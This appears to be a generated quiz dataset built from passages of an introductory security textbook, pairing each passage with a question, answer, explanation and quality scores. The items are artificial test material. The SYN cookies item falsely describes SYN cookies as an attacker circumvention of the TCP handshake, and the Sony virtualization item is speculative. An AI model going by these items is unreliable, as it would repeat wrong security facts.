{"context": "### 3.3.7. RAT {#_computer_systems_security_planning_for_success.xhtml__rat}\nRAT stands for Remote Access Trojan an it is used to gain full access and control of a remote target. The malware\n\ndistributor can browse the files on a computer, send keystrokes and mouse movements, view the screen, and/or monitor the\n\ninput from the microphone and camera. RATs often actively bypass security controls and as such they may be difficult to\n\ndetect.\n\n:::\n\n::: {.section .sect3 title=\"3.3.8. Adware / Potentially Unwanted Programs (PUP)\"}\n\n\n### 3.3.8. Adware / Potentially Unwanted Programs (PUP) {#_computer_systems_security_planning_for_success.xhtml__adware_potentially_unwanted_programs_pup}\nAdware is malware that is designed to track user behavior and deliver unwanted, sometimes intrusive, tailored ads.\n\nAdware may slow down a system and/or add ad walls to sites. This type of malware often targets a users web browser.\n\nPotentially Unwanted Programs (PUP) are typically downloaded as part of the install of another program. Commons PUPs are\n\nbrowser toolbars, PDF readers, compression utilities, or browser extensions. These programs may have adware/spyware\n\ncomponents in them and can also slow down a system.\n\n:::\n\n::::::::::::::::::::::::\n\n::::: {.section .sect2 title=\"3.4. Indicators of Compromise\"}\n", "topic": "Describe the key differences in the primary objective and operational characteristics between a Remote Access Trojan (RAT) and Adware/Potentially Unwanted Programs (PUP).", "question": "What distinguishes a Remote Access Trojan (RAT) from Adware/Potentially Unwanted Programs (PUPs) in terms of their fundamental purpose and how they interact with a user's system?", "answer": "RATs offer remote control, while PUPs deliver advertisements.", "explanation": "RATs prioritize gaining and maintaining remote control, while PUPs focus on delivering advertisements and tracking user behavior.", "question_token_count": 41, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 15, "choices": null}
{"context": "## 3.4. Indicators of Compromise {#_computer_systems_security_planning_for_success.xhtml__indicators_of_compromise}\nAn *indicator of compromise (IoC)* is an artifact with high confidence the indicates an intrusion. It is a way to tell\n\nif a machine has been a victim of malware. IoCs are publicly communicated by security professionals in an effort to help\n\nmitigate the effects of malware.\n\n:::: description-list\n\n::: title\n\nCommon IoC Types\n\n:::\n\n[Hash]{.term}\n\n:   [A hash of files that are known to be malicious. This can help in identifying trojans and worms.]{.principal}\n\n[IP addresses]{.term}\n\n:   [Tracking the IP addresses which malware connects to can be used to determine if a machine is infected.]{.principal}\n\n[URLs/Domains]{.term}\n\n:   [Tracking the URLs or domains that malware uses can also be used to determine if a machine is infected.]{.principal}\n\n[Virus definition/signature]{.term}\n\n:   [Executables and other files can be scanned for specific sequences of bytes which are unique to a particular virus.\n\n    In this way even if the malware is hiding within another file, it can still be detected.]{.principal}\n\n::::\n\n:::::\n\n:::::::::: {.section .sect2 title=\"3.5. Delivery of Malware\"}\n", "topic": "How do security professionals utilize the sharing of IoCs to mitigate the effects of malware attacks?", "question": "How does the public dissemination of Indicators of Compromise (IoCs) contribute to the overall mitigation strategy against malware attacks?", "answer": "To help mitigate the effects of malware.", "explanation": "The text explicitly states that security professionals share IoCs to help mitigate the effects of malware. This demonstrates the crucial role of IoCs in proactive defense.", "question_token_count": 25, "answer_correctness_score": 8, "explanation_validity_score": 7, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 9, "choices": null}
{"context": "# Instructional Notes {#_computer_systems_security_planning_for_success.xhtml__instructional_notes}\nThe text, labs, and review questions in this book are designed as an introduction to the applied topic of computer\n\nsecurity. With these resources students will learn ways of preventing, identifying, understanding, and recovering from\n\nattacks against computer systems. This text also presents the evolution of computer security, the main threats, attacks\n\nand mechanisms, applied computer operation and security protocols, main data transmission and storage protection\n\nmethods, cryptography, network systems availability, recovery, and business continuation procedures.\n\n:::: {.section .sect2 title=\"Learning Outcomes\"}\n\n\n## Learning Outcomes {#_computer_systems_security_planning_for_success.xhtml__learning_outcomes}\nThe chapters, labs, and review questions in this text are designed to align with the objectives [CompTIA Security+\n\nSY0-601](https://www.comptia.jp/pdf/CompTIA%20Security+%20SY0-601%20Exam%20Objectives%20(3.0).pdf){.link} exam. The\n\nobjectives are reproduced here for reference:\n\n::: itemized-list\n\n- [1.1 Compare and contrast different types of social engineering techniques.]{.principal}\n\n- [1.2 Given a scenario, analyze potential indicators to determine the type of attack.]{.principal}\n\n- [1.3 Given a scenario, analyze potential indicators associated with application attacks.]{.principal}\n\n- [1.4 Given a scenario, analyze potential indicators associated with network attacks.]{.principal}\n\n- [1.5 Explain different threat actors, vectors, and intelligence sources.]{.principal}\n\n- [1.6 Explain the security concerns associated with various types of vulnerabilities.]{.principal}\n\n- [1.7 Summarize the techniques used in security assessments.]{.principal}\n\n- [1.8 Explain the techniques used in penetration testing.]{.principal}\n\n- [2.1 Explain the importance of security concepts in an enterprise environment.]{.principal}\n\n- [2.2 Summarize virtualization and cloud computing concepts.]{.principal}\n\n- [2.3 Summarize secure application development, deployment, and automation concepts.]{.principal}\n\n- [2.4 Summarize authentication and authorization design concepts.]{.principal}\n\n- [2.5 Given a scenario, implement cybersecurity resilience.]{.principal}\n\n- [2.6 Explain the security implications of embedded and specialized systems.]{.principal}\n\n- [2.7 Explain the importance of physical security controls.]{.principal}\n\n- [2.8 Summarize the basics of cryptographic concepts.]{.principal}\n\n- [3.1 Given a scenario, implement secure protocols.]{.principal}\n\n- [3.2 Given a scenario, implement secure network architecture concepts.]{.principal}\n\n- [3.3 Given a scenario, implement secure network designs.]{.principal}\n\n- [3.4 Given a scenario, install and configure wireless security settings.]{.principal}\n\n- [3.5 Given a scenario, implement secure mobile solutions.]{.principal}\n\n- [3.6 Given a scenario, apply cybersecurity solutions to the cloud.]{.principal}\n\n- [3.7 Given a scenario, implement identity and account management controls.]{.principal}\n\n- [3.8 Given a scenario, implement authentication and authorization solutions.]{.principal}\n\n- [3.9 Given a scenario, implement public key infrastructure.]{.principal}\n\n- [4.1 Given a scenario, use the appropriate tool to assess organizational security.]{.principal}\n\n- [4.2 Summarize the importance of policies, processes, and procedures for incident response.]{.principal}\n\n- [4.3 Given an incident, utilize appropriate data sources to support an investigation.]{.principal}\n\n- [4.4 Given an incident, apply mitigation techniques or controls to secure an environment.]{.principal}\n\n- [4.5 Explain the key aspects of digital forensics.]{.principal}\n\n- [5.1 Compare and contrast various types of controls.]{.principal}\n\n- [5.2 Explain the importance of applicable regulations, standards, or frameworks that impact organizational security\n\n  posture.]{.principal}\n\n- [5.3 Explain the importance of policies to organizational security.]{.principal}\n\n- [5.4 Summarize risk management processes and concepts.]{.principal}\n\n- [5.5 Explain privacy and sensitive data concepts in relation to security.]{.principal}\n\n:::\n\n::::\n\n::::: {.section .sect2 title=\"Example Schedule\"}\n", "topic": "Compare and contrast various types of controls, as detailed in the learning outcomes.", "question": "Considering the learning outcomes listed, which statement best encapsulates the diverse range of control types implicitly covered by this material?", "answer": "A comprehensive range of security controls, including physical, technical, administrative, and operational approaches.", "explanation": "The learning outcomes span physical security, technical controls (like cryptography and secure protocols), administrative controls (policies and procedures), and operational controls (assessment and penetration testing).", "question_token_count": 24, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 19, "choices": null}
{"context": "## 1.5. Security Plans {#_computer_systems_security_planning_for_success.xhtml__security_plans}\nWhile confronting such a diverse array of actors can seem daunting at first, the key element to being successful is\n\nhaving a plan. A *security plan* analyzes the risks, details the resources that need to be protected, and presents a\n\nclear path to protecting them. Typically a security plan utilizes the three types of security controls available:\n\nphysical, administrative, and technical.\n\n::: itemized-list\n\n- [Physical controls are things like door locks, cameras, or even the way rooms in a building are laid out. These things\n\n  can have a dramatic impact on the overall security and should not be overlooked!]{.principal}\n\n- [Administrative controls include human resources policies (HR), classifying and limiting access to data, and\n\n  separating duties. It helps to have a whole-organization understanding of security to make it easier to put these\n\n  controls in place.]{.principal}\n\n- [Technical controls are often what new security professionals think of first. These are things like intrusion\n\n  detection systems (IDS), firewalls, anti-malware software, etc. While these are an important segment of security and\n\n  they are the segment that falls almost entirely within the purview of IT, it is critical to remember that these are\n\n  only as strong as the physical and administrative controls that support them!]{.principal}\n\n:::\n\n<aside class=\"admonition warning\" title=\"Warning\" epub:type=\"notice\">\n\n::: content\n\nPhysical controls definitely lack the cool factor that technical controls have. Movies typically show security\n\nprofessionals hunched over laptops typing frantically or scrolling rapidly through pages and pages of logs on a giant\n\nscreen. Rarely do they show them filling out a purchase order (PO) to have a locksmith come in and re-key the locks to\n\nthe data closet. Just because it isn't cool doesn't mean it isn't important! Remember, once an attacker has physical\n\naccess, anything is possible.\n\n:::\n\n</aside>\n\n:::::\n\n:::: {.section .sect2 title=\"1.6. Tools of the Trade\"}\n", "topic": "What is the primary warning conveyed regarding the underestimation of physical security measures?", "question": "What is the primary warning conveyed regarding the underestimation of physical security measures?", "answer": "Physical controls are frequently underestimated and considered less important than technical controls.", "explanation": "The passage explicitly states that physical controls are often overlooked due to their lack of perceived importance or \u201ccool factor,\u201d despite being fundamentally crucial for overall security.", "question_token_count": 16, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 14, "choices": null}
{"context": "## 9.3. Incidents {#_computer_systems_security_planning_for_success.xhtml__incidents}\nIncidents are part of working at an SOC, they will occur. The best SOCs may spot them before they're an issue (or an\n\nincident even) and have practice how to respond and recovery. The goal is to maintain continuity of services provided\n\neven if an incident occurs.\n\n::: {.section .sect3 title=\"9.3.1. Precursors\"}\n\n\n### 9.3.1. Precursors {#_computer_systems_security_planning_for_success.xhtml__precursors}\nTypically before an incident takes place, there are warning signs or precursors telling you that an incident is going to\n\noccur. Precursors may be obvious like threats from APTs, criminal organizations, or Hacktivist. They can also be subtle,\n\nsuch as patterns of recon in web server logs or evidence of transient port scans. Finally a precursor may be the\n\ndiscovery of a new exploit which leads to an uptick in malicious actor activity for everyone. In all cases, it's\n\nimportant to keep an eye out for precursors. If an incident is caught in this phase it is much easier to handle.\n\n:::\n\n::: {.section .sect3 title=\"9.3.2. Indicators\"}\n", "topic": "What are the key distinctions between precursors and indicators of security incidents, according to the text?", "question": "What is the fundamental difference in nature and timing between precursors and indicators of a security incident, as described in the provided text?", "answer": "Precursors are warning signs *before* an incident, while indicators are evidence *during* an incident.", "explanation": "The text explicitly contrasts precursors, which are predictive warning signs, with indicators, which are observed evidence during an incident.", "question_token_count": 26, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 8, "avg_answer_token_count": 22, "choices": null}
{"context": "### 9.3.2. Indicators {#_computer_systems_security_planning_for_success.xhtml__indicators}\nThe next level up from a precursor is an indicator. An indicator is an alert showing that an incident has been detected.\n\nThese may be raised by the IDS/IPS, endpoint management system, malware scanners, network devices, or even a user\n\nreport.\n\nOnce and indicator alarm has been triggered, an SOC member must respond and investigate. In the best case scenario the\n\nindicator is telling you that an incident has been detected before too much damage has been done.\n\n:::\n\n:::::\n\n::::::::::::::: {.section .sect2 title=\"9.4. Response\"}\n\n\n## 9.4. Response {#_computer_systems_security_planning_for_success.xhtml__response}\nIn the response phase, the SOC deals with an incident to mitigate the harm it causes. Every incident is different, but\n\nthe governing principles and steps are the same.\n\n::::: {.section .sect3 title=\"9.4.1. Business Continuity\"}\n\n\n### 9.4.1. Business Continuity {#_computer_systems_security_planning_for_success.xhtml__business_continuity}\nThe concept of continuity is central to the steps taken to respond to an incident. Remember that the goal is to keep\n\nthings running and keep services available. Business Continuity has three main parts: Business Continuity Planning\n\n(BCP), Business Impact Analysis (BIA), and Disaster Recovery Planning (DRP).\n\nBusiness Continuity Planning (BCP) is a methodology for keeping things running. With BCP threats are identified in\n\nadvance and critical business processes are prioritized. Recovery procedures for these processes have been developed and\n\ntested. In response to an incident, these procedures are followed as practiced.\n\nBusiness Impact Analysis (BIA) identifies business functions and rates the impact of an outage on these functions. BIA\n\nmeasures the impact of an outage on:\n\n::: itemized-list\n\n- [Property (tangible assets)]{.principal}\n\n- [Finance (monetary funding)]{.principal}\n\n- [Safety (physical protection)]{.principal}\n\n- [Reputation (status)]{.principal}\n\n- [Life (well being)]{.principal}\n\n- [Customers]{.principal}\n\n:::\n\nBIA can help pinpoint mission-essential functions and single points of failure. This allows SOCs to determine where\n\nthere resources should go in terms of having the best chance of maintaining business continuity.\n\nFinally having a Disaster Recovery Plan (DRP) makes it easier to recover in the case of a large-scale issue. Disaster\n\nRecovery (DR) entails policies, tools, and procedures to recover from an outage. DRPs will detail order of restoration\n\nand require a lot of testing to ensure that the entire suite of supported applications can be brought back up. A\n\nstandard DRP will detail:\n\n::: itemized-list\n\n- [Purpose and Scope]{.principal}\n\n- [Recovery Team]{.principal}\n\n- [Preparing for a Disaster]{.principal}\n\n- [Emergency Procedures or Incident Response During an Incident]{.principal}\n\n- [Restoration Procedures and Return to Normal]{.principal}\n\n:::\n\n:::::\n\n::::::: {.section .sect3 title=\"9.4.2. Redundancy\"}\n", "topic": "What are the primary sources of incident detection alerts, according to the text, and why is it important to utilize multiple sources?", "question": "Beyond simply identifying the sources of incident detection alerts, what is the strategic rationale for employing a diversified approach to monitoring \u2013 incorporating data from IDS/IPS, endpoint systems, and user reports \u2013 as outlined within the context of incident response?", "answer": "A diversified monitoring approach, incorporating data from multiple sources like IDS/IPS, endpoint systems, and user reports, is strategically vital for comprehensive incident detection and minimizing the risk of undetected threats.", "explanation": "The text indicates that alerts originate from multiple sources. Utilizing a diverse range of monitoring sources is crucial for comprehensive incident detection, reducing the risk of overlooking potential threats that might be missed by a single system.", "question_token_count": 47, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 7, "question_groundedness_score": 6, "avg_answer_token_count": 39, "choices": null}
{"context": "### 9.1.1. MITRE {#_computer_systems_security_planning_for_success.xhtml__mitre}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/mitre.svg\" width=\"200\" alt=\"mitre\" />\n\n</div>\n\n<figcaption><a href=\"https://commons.wikimedia.org/wiki/File:Mitre_Corporation_logo.svg\" class=\"link\">The MITRE\n\nCorporation, Public domain, via Wikimedia Commons</a></figcaption>\n\n</figure>\n\nIn the 1940s and 1950s MIT scientists developed large-scale computing laboratories. In 1958 MITRE was formed as a\n\nprivate corporation from the personnel and equipment in these labs. Currently, MITRE is a federally funded research and\n\ndevelopment center.\n\nAs mentioned previously, MITRE maintains the CVE DB. MITRE has also developed the ATT&CK framework for analyzing\n\nincidents. We will go through each step of the framework at the end of this chapter.\n\n:::\n\n:::: {.section .sect3 title=\"9.1.2. NIST\"}\n\n\n### 9.1.2. NIST {#_computer_systems_security_planning_for_success.xhtml__nist}\nNIST stands for National Institute of Standards and Technology. It is a federally supported through the US Department of\n\nCommerce and posits itself as an institute to promote American innovation. NIST develops standards, guidelines, and best\n\npractices in technical fields.\n\nNIST also has a security framework they've developed known as the NIST framework. It outlines the general\n\nresponsibilities of a security team:\n\n::: itemized-list\n\n- [Identify]{.principal}\n\n- [Protect]{.principal}\n\n- [Detect]{.principal}\n\n- [Respond]{.principal}\n\n- [Recover]{.principal}\n\n:::\n\n::::\n\n::: {.section .sect3 title=\"9.1.3. OWASP\"}\n", "topic": "The NIST security framework\u2019s five key responsibilities: Identify, Protect, Detect, Respond, and Recover.", "question": "Considering the NIST security framework\u2019s five responsibilities \u2013 Identify, Protect, Detect, Respond, and Recover \u2013 which of these represents the foundational step requiring proactive assessment and planning before implementing other security measures?", "answer": "Identify", "explanation": "The \u201cIdentify\u201d responsibility is the initial step, focusing on understanding the organization's assets, vulnerabilities, and potential threats. This proactive assessment forms the basis for subsequent security efforts.", "question_token_count": 39, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 2, "choices": null}
{"context": "## Sony Rootkit\n::: content\n\nIn 2005 Sony released CDs for their music software with an application rootkit designed to run on Microsoft Windows\n\nsystems. The rootkit ran persistently in the background, slowing systems, and did not have an uninstaller to remove the\n\nprogram. It was designed to prevent the OS from copying information from audio CDs, but it also opened up several\n\nsecurity holes that could be exploited by other malware. Ultimately the rootkit led to several class-action lawsuits\n\nagainst Sony BMG and a led to a settlement with the Federal Trade Commission that required Sony to reimburse customers\n\nwho reported damages from the rootkit.\n\n:::\n\n</aside>\n\n::::::\n\n::: {.section .sect3 title=\"3.3.6. Botnet\"}\n\n\n### 3.3.6. Botnet {#_computer_systems_security_planning_for_success.xhtml__botnet}\nA botnet is a network of exploited hosts controlled by a single party. These hosts may be desktop computers, servers, or\n\neven internet of things (IoT) devices. Botnets are often used in large-scale distributed denial of service (DDoS)\n\nattacks where the nature of the attack is to have many machines flooding a single machine with traffic. Botnets may also\n\nbe used to send spam emails as their access to SMTP email relay may vary depending on their internet service provider\n\n(ISP).\n\nBots are typically controlled through a command and control (C2, C&C) server. While this C2 server may use a custom\n\nprotocol, it is far more typical for modern botnets to rely on other infrastructure. C2 traffic can use SSH, HTTP,\n\nInternet Relay Chat (IRC), or even Discord to send commands to bots and receive data from bots.\n\n:::\n\n::: {.section .sect3 title=\"3.3.7. RAT\"}\n", "topic": "The persistent nature of the Sony Rootkit and its impact on system performance, highlighting the lack of an uninstaller.", "question": "Beyond its intended function of preventing CD copying, what specific operational characteristic of the Sony Rootkit directly contributed to its legal repercussions and consumer harm?", "answer": "Lack of an uninstaller", "explanation": "The rootkit\u2019s lack of an uninstaller meant it remained active on systems long after its initial installation, causing ongoing performance issues and leaving users with no easy way to remove it.", "question_token_count": 30, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 7, "choices": null}
{"context": "## 9.7. Lab: Reporting on the 2014 Sony Pictures Hack {#_computer_systems_security_planning_for_success.xhtml__lab_reporting_on_the_2014_sony_pictures_hack}\nTake a moment to read through the details of the [2014 Sony Pictures\n\nHack](https://en.wikipedia.org/wiki/Sony_Pictures_hack){.link}. Feel free to research an used other sources as well.\n\nImagine you are responsible for disclosing the details of the attack to affected parties shortly after it had occurred.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nCome up with two different groups that should receive a disclosure from Sony as a result of the 2014 breach. Write a\n\ndisclosure email for each of them, detailing what happened, what the response was, and what the effect of the party is.\n\nBe sure to keep your audience in mind when determining how much detail and what types of things should be discussed in\n\nthe email.\n\n:::\n\n</aside>\n\n::::\n\n::::::::::::::::::::::::::::::::::::::::::::\n\n:::::::::::::::::::::::: {.section .sect1 title=\"10. Virtualization\"}\n\n\n# 10. Virtualization {#_computer_systems_security_planning_for_success.xhtml__virtualization}\nInformation Technology has seen massive growth in the adoption of virtualization as the underpinning of dynamic and\n\nrobust systems. This shift from bare-metal resources to virtual resources provides its own unique security challenges\n\nand considerations. As the field changes, it is important for anyone working in cybersecurity to not only understand how\n\nthese systems work, but also be able to approach their implementation with a security-first mindset.\n\n::::::::: {.section .sect2 title=\"10.1. Methods\"}\n", "topic": "Considering the increasing use of virtualization, what unique security vulnerabilities related to the 2014 Sony Pictures Hack could have been exacerbated by the virtualization infrastructure employed by Sony?", "question": "How might Sony\u2019s reliance on virtualization have introduced or amplified vulnerabilities that facilitated the data exfiltration during the 2014 Sony Pictures Hack?", "answer": "Increased attack surface and lateral movement opportunities.", "explanation": "The context establishes virtualization as a core IT trend and links it to unique security considerations. The question probes for how this trend could have specifically worsened the breach, requiring an understanding of how virtualization environments introduce attack vectors.", "question_token_count": 30, "answer_correctness_score": 9, "explanation_validity_score": 8, "question_clarity_score": 8, "question_groundedness_score": 4, "avg_answer_token_count": 9, "choices": null}
{"context": "### 2.10.3. Elliptic-curve Cryptography (ECC) {#_computer_systems_security_planning_for_success.xhtml__elliptic_curve_cryptography_ecc}\nECC is an asymmetric encryption scheme that is quite fast and easy to computer. It is rapidly becoming the go to choice\n\nfor digital signatures and key exchanges, gaining adopting starting in 2004. ECC is based on the geometry of a\n\npre-determined set of curves (some examples can be found [here](http://www.secg.org/sec2-v2.pdf){.link}), which can be\n\nused to create a trapdoor function.\n\n:::\n\n:::: {.section .sect3 title=\"2.10.4. Diffie-Hellman Key Exchange\"}\n\n\n### 2.10.4. Diffie-Hellman Key Exchange {#_computer_systems_security_planning_for_success.xhtml__diffie_hellman_key_exchange}\n::: float-group\n\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/dh.svg\" width=\"300\" alt=\"dh\" />\n\n</div>\n\n<figcaption><a href=\"https://commons.wikimedia.org/wiki/File:Diffie-Hellman_Key_Exchange.svg\" class=\"link\">Original\n\nschema: A.J. Han Vinck, University of Duisburg-EssenSVG version: Flugaal</a>, Public domain, via Wikimedia\n\nCommons</figcaption>\n\n</figure>\n\nGiven the slow nature of asymmetric algorithms, often an application such as a VPN will choose to use asymmetric\n\ncryptography to exchange a shared secret key and then use that secret key with a faster symmetric algorithm such as AES.\n\nDiffie-Hellman does exactly that and was first published in 1976. Diffie-Hellman key exchange uses the same mathematical\n\nconcepts as RSA, exponentiation and modulus arithmetic, to great effect, but to visualize what is happening a metaphor\n\nof secret color mixing is used (see the included diagram). It is important to remember that because the medium of\n\nexchange may be slow a DH key exchange is designed to generate minimal traffic.\n\n:::\n\n::::\n\n::: {.section .sect3 title=\"2.10.5. Digital Certificates\"}\n", "topic": "Explain how ECC is increasingly favored over traditional asymmetric algorithms such as RSA, according to the text.", "question": "What specific characteristics of Elliptic-curve Cryptography (ECC) contribute to its increasing adoption compared to algorithms like RSA, as described in the provided text?", "answer": "Speed and ease of computation.", "explanation": "The text states that ECC\u2019s speed and ease of computation are primary reasons for its rising popularity, particularly for digital signatures and key exchanges.", "question_token_count": 31, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 7, "choices": null}
{"context": "## 10.6. Review Questions {#_computer_systems_security_planning_for_success.xhtml_virt_review}\n::: description-list\n\n[Why might a company choose to deploy an application on the public cloud? Does this entail any new security considerations?]{.term}\n\n:   []{.principal}\n\n[Which type of service requires more trust in the provider, IaaS or PaaS? Why?]{.term}\n\n:   []{.principal}\n\n[How do the 4C's of cloud native security reflect the principle of *layered security*? Do any of the layers overlap?]{.term}\n\n:   []{.principal}\n\n:::\n\n::::\n\n::::::::::::::::::::::::\n\n<footer class=\"chapter-footer\">\n\n::: footnotes\n\n:::\n\n</footer>\n\n::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n\n[^1]: Talking Heads. (1977). Psycho killer \\[song\\]. On Talking Heads:77. Sire Records.\n\n[^2]: In actuality the code space was so small that you could even easily create a device to cycle through all possible\n\n    codes in under a minute.\n\n[^3]: This algorithm is so poor that it may be a stretch even to call it a hashing algorithm. That being said, it is\n\n    being used as a tool to explain what hashes are.\n\n[^4]: For an interesting example of how you can change but still follow a protocol, check out [SYN\n\n    cookies](https://en.wikipedia.org/wiki/SYN_cookies){.link}.\n\n[^5]: Khalaf, Emad. (2017). A Survey of Access Control and Data Encryption for Database Security. journal of King\n\n    Abdulaziz University Engineering Sciences. 28. 19-30. 10.4197/Eng.28-1.2. Reproduced under license: CC BY-NC 4.0\n", "topic": "Considering the potential for vulnerabilities in cloud infrastructure, how does the concept of \"SYN cookies\" challenge traditional network security protocols and what implications does this have for cloud security design?", "question": "SYN cookies represent a circumvention of standard TCP connection establishment mechanisms. How does this capability, exemplified in the provided text, fundamentally challenge the assumptions of traditional network security protocols, and what specific design considerations must be incorporated into cloud security architectures to mitigate the risks associated with such manipulations?", "answer": "Cloud security designs must incorporate mechanisms beyond traditional TCP validation, such as connection rate limiting, SYN flood detection, and potentially alternative connection establishment protocols.", "explanation": "The answer correctly identifies that SYN cookies bypass the standard three-way handshake, allowing attackers to establish connections without a valid source port. This undermines the core security mechanisms of TCP.", "question_token_count": 58, "answer_correctness_score": 8, "explanation_validity_score": 7, "question_clarity_score": 8, "question_groundedness_score": 1, "avg_answer_token_count": 29, "choices": null}
{"context": "### 2.10.7. Trusted Platform Module (TPM) / Hardware Security Module (HSM) {#_computer_systems_security_planning_for_success.xhtml__trusted_platform_module_tpm_hardware_security_module_hsm}\nThese modules provide hardware specifically for use with encryption. HSMs are removable modules while TPMs are\n\nmotherboard chips. Many ciphers rely on a reliable source of entropy (randomness) which these modules provide. They can\n\nalso significantly increase the speed at which cryptographic algorithms run by moving the operations to specialized\n\nhardware. Lastly, these modules can be used to store keys *and* make them only accessible via the module. This can add\n\nan extra layer of security to prevent the keys from being easily copied.\n\n:::\n\n::: {.section .sect3 title=\"2.10.8. Steganography\"}\n\n\n### 2.10.8. Steganography {#_computer_systems_security_planning_for_success.xhtml__steganography}\nSteganography is the process of hiding data in something such that to a casual observer it cannot be detected. Data can\n\nbe hidden in audio, images, or even [plain\n\ntext!](https://dl.packetstormsecurity.net/crypt/snow/description.html){.link}. The hidden data can also be encrypted if\n\nan additional layer of security is required. In the field of security, malicious code may be hidden inside other files\n\nusing steganographic techniques. This makes it more difficult for tools to find them when searching storage.\n\n:::\n\n::::::::::::\n\n:::::::::::: {.section .sect2 title=\"2.11. Lab: Hash it Out\"}\n", "topic": "Explain the significance of key storage within a TPM/HSM, and how this mechanism differs from storing keys in software.", "question": "How does the mechanism of key storage within a TPM/HSM contribute to overall system security, and what is the primary advantage over storing keys solely within software?", "answer": "Restricted key access.", "explanation": "The TPM/HSM\u2019s ability to restrict key access to the module itself prevents easy copying of keys, adding an extra layer of security.", "question_token_count": 32, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 6, "question_groundedness_score": 10, "avg_answer_token_count": 5, "choices": null}
{"context": "### 9.4.2. Redundancy {#_computer_systems_security_planning_for_success.xhtml__redundancy}\nRedundant services can help with continuity by making sure there is always an uncompromised service available. The key\n\nconcepts of redundancy are detailed within the language it uses:\n\n::: description-list\n\n[Redundancy]{.term}\n\n:   [extra components/services that run in case of failures]{.principal}\n\n[Failover]{.term}\n\n:   [the process of turning over to a secondary device]{.principal}\n\n[High availability (HA)]{.term}\n\n:   [ensures high level of operation performance]{.principal}\n\n[Fault tolerance]{.term}\n\n:   [allows a system to continue in the event of a failure]{.principal}\n\n[Single Point of Failure (SPOF)]{.term}\n\n:   [a single failure that can cause an outage]{.principal}\n\n:::\n\n::: {.section .sect4 title=\"Hot, Cold, &amp; Warm\"}\n\n\n#### Hot, Cold, & Warm {#_computer_systems_security_planning_for_success.xhtml__hot_cold_warm}\nOne typical way to implement redundancy is through the use of hot, cold, and warm sites.\n\nA hot site is a secondary location that is live and replicating in real-time what is happening in production. In the\n\ncase of the primary site going down, a hot site can failover immediately.\n\nA cold site is a secondary location without equipment. A cold site will take some time to set up and configure in the\n\ncase of an outage.\n\nA warm site is a secondary location with all equipment and connectivity. The equipment will still need to be turned on\n\nand made production ready, but it will not take as long to failover to a warm site as a cold one.\n\n:::\n\n:::: {.section .sect4 title=\"RAID\"}\n", "topic": "What are the key trade-offs between using a hot site, a cold site, and a warm site for redundancy?", "question": "What are the primary differences in terms of speed of failover and initial setup time between a hot site, a cold site, and a warm site implementation of redundancy?", "answer": "Hot site \u2013 immediate, Cold site \u2013 lengthy, Warm site \u2013 moderate.", "explanation": "The answer correctly identifies that a hot site offers immediate failover, a cold site requires significant setup time, and a warm site provides a middle ground.", "question_token_count": 34, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 16, "choices": null}
{"context": "## 1.2. Learning the Lingo {#_computer_systems_security_planning_for_success.xhtml__learning_the_lingo}\nIn general, the technical fields are laden with acronyms and obtuse vocabulary. Unfortunately security is no exception\n\nto this rule. Three of the most important acronyms you should be aware of to start are *CIA*, *AAA*, and *DRY*.\n\n::: {.section .sect3 title=\"1.2.1. CIA\"}\n\n\n### 1.2.1. CIA {#_computer_systems_security_planning_for_success.xhtml__cia}\n<figure class=\"image right\">\n\n<div class=\"content\">\n\n<img src=\"images/cia.svg\" width=\"300\" alt=\"cia\" />\n\n</div>\n\n</figure>\n\nWhile the Central Intelligence Agency does have a role to play in information security, for our purposes CIA is an\n\nacronym used to remember the three foundational information security principles: confidentiality, integrity, and\n\navailability. These ideas form the cornerstone of security and should be ever-present in your thoughts.\n\n*Confidentiality* refers to the practice of keeping secret information secret. For example, if an e-commerce site stores\n\ncredit card numbers (a questionable practice to begin with) those credit card numbers should be kept *confidential*. You\n\nwould not want other users of the site or outsiders to have access to your credit card number. Many steps could be taken\n\nto ensure the confidentiality of user credit card numbers, but at this point it is enough to understand that maintaining\n\nconfidentiality is a principle of security.\n\n*Integrity* is an assurance that data has not been corrupted or purposefully tampered with. As we discussed previously,\n\ndata is very valuable, but how valuable is it if you can't be sure it is intact and reliable? In security we strive to\n\nmaintain integrity so that the system and even the controls we have in place to guard the system can be trusted. Imagine\n\nthat e-commerce site again. What would happen if an attacker could arbitrarily change delivery addresses stored in the\n\nsystem? Packages could be routed to improper addresses and stolen and honest customers would not receive what they\n\nordered, all because of an integrity violation.\n\n*Availability* means that a system should remain up and running to ensure that valid users have access to the data when\n\nneeded. In the simplest sense, you could ensure confidentiality and integrity by simply taking the system off line and\n\nnot allowing any access. Such a system would be useless and this final principle addresses that. Systems are designed to\n\nbe accessible and part of your security plan should be ensuring that they are. You will need to account for the costs of\n\nimplementing confidentiality and integrity and make sure that the resources are available to keep the system working. In\n\nan extreme case, denial of service (DoS) attacks can actually target availability. By keeping this principle in mind,\n\nhopefully you can mitigate some of those risks.\n\n:::\n\n::: {.section .sect3 title=\"1.2.2. 